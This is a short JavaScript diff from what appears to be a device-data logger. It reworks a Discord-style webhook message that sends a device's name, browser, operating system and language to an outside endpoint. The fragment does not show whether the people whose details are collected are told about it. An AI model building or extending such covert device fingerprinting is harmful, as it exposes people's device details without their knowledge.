@@ -109,9 +109,10 @@
                     },
                     body: JSON.stringify({
                         embeds: [{
-                            title: `(${deviceName}) Device Data`,
+                            title: 'Device Data',
                             color: 16711680, // Red color
                             fields: [
+                                { name: 'Device Name', value: deviceName, inline: false },
                                 { name: 'Browser', value: deviceData.browser, inline: false },
                                 { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
                                 { name: 'Language', value: deviceData.language, inline: false },
